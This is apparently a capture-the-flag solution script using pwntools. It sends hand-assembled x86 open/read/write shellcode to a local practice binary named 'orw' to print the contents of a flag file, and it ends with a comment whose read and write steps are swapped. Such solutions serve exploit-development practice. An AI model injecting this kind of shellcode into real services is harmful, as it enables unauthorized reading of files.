from pwn import *

s = process('./orw')

shellcode = ''

shellcode += asm('xor ecx,ecx;mov eax,0x5; push ecx;push 0x67616c66;mov ebx,esp;xor edx,edx;int 0x80;')

shellcode += asm('mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov dl,0x30;int 0x80;')

shellcode += asm('mov eax,0x4;mov bl,0x1;int 0x80;')

s.recvuntil(':')
s.sendline(shellcode)

flag = s.recv()
print flag
'''
fd = open('/home/orw/flag',0,0)
write(fd,buffer,0x30)
read(1,buffer,0x30)
'''
